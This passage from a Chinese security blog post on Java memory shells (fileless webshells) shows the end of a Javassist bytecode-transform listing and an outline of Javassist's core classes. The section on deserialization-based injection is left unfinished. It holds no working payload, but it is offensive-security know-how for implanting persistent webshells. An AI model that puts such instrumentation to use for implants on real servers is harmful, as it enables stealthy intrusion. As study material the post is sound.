</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w>                        </span><span class=s>&#34;    }\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w>                        </span><span class=s>&#34;}&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>33</span><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>34</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>b</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>36</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>37</span><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w> 
</span></span></span><span class=line><span class=ln>38</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>39</span><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>40</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>41</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h5 id=-javassist>Ⅱ. Javassist</h5><p><code>transform()</code>方法用于对字节码进行各种操作，而具体的操作则需要借助 <code>javassist</code>库。</p><p><code>Javassist</code>（Java Programming Assistant）是一个用于处理和操作Java字节码的类库。它提供了一种相对简单的方式来编辑现有的类或创建新的类，而不需要深入了解Java虚拟机（JVM）指令集。以下是Javassist中一些关键类的介绍：</p><p><strong>核心类:</strong></p><ul><li><strong>ClassPool</strong><ul><li>这是Javassist的核心类之一，可以看作是CtClass对象的容器。它维护了一个从类名到CtClass实例的映射表。</li><li>使用 <code>ClassPool.getDefault()</code>来获取默认的ClassPool实例，它会搜索当前的系统类路径。</li></ul></li><li><strong>CtClass</strong><ul><li>代表一个编译时的类定义（Compile-Time Class）。你可以通过ClassPool对象来获取或创建CtClass实例，并对其进行修改。</li><li>提供了添加字段、方法、构造函数等功能，并且可以将修改后的类转换回字节码或保存为.class文件。</li></ul></li><li><strong>CtField</strong><ul><li>表示类中的字段（成员变量）。你可以使用这个类来动态地添加、删除或修改类的字段。</li></ul></li><li><strong>CtMethod</strong><ul><li>表示类中的方法。允许你动态地添加新方法、修改现有方法的主体或签名。</li></ul></li><li><strong>CtConstructor</strong><ul><li>类似于CtMethod，但专门用于处理类的构造函数。</li></ul></li><li><strong>CtBehavior</strong><ul><li>是CtMethod和CtConstructor的父类，提供了对方法和构造函数通用行为的操作接口，例如插入代码到方法或构造函数的开头或结尾。</li></ul></li></ul><h2 id=0x03-反序列化注入内存马>0x03 反序列化注入内存马</h2><p><strong>To be continue</strong></p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%86%85%E5%AD%98%E9%A9%AC/>内存马</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc3%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc3%E9%93%BE/cx.c95681bdcae441ff61c8196eaad7764e_hu_cbcab9c6efb3d857.jpeg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC3链" data-hash="md5-yVaBvcrkQf9hyBluqtd2Tg=="></div><div class=article-details><h2 class=article-title>Java反序列化CC3链</h2></div></a></article><article><a href=/p/templatesimpl%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8/><div class=article-details><h2 class=article-title>TemplatesImpl恶意利用</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc2%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc2%E9%93%BE/su7u.4d5a0453066295eaed763a2cb83fa5b3_hu_7c2a875cd1b4cd19.jpg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC2链" data-hash="md5-TVoEUwZilertdjosuD+lsw=="></div><div class=article-details><h2 class=article-title>Java反序列化CC2链</h2></div></a></article><article class=has-image><a href=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc1%E9%93%BE/><div class=article-image><img src=/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96cc1%E9%93%BE/%E7%99%BD%E6%9C%88%E9%AD%81.9236f11540c77ae1ad3f361b87bdb706_hu_719a98baf0ac77eb.jpg width=250 height=150 loading=lazy alt="Featured image of post Java反序列化CC1链" data-hash="md5-kjbxFUDHeuGtPzYbh723Bg=="></div><div class=article-details><h2 class=article-title>Java反序列化CC1链</h2></div></a></article><article><a href=/p/java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><div class=article-details><h2 class=article-title>Java 序列化与反序列化</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2025 B5juan's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>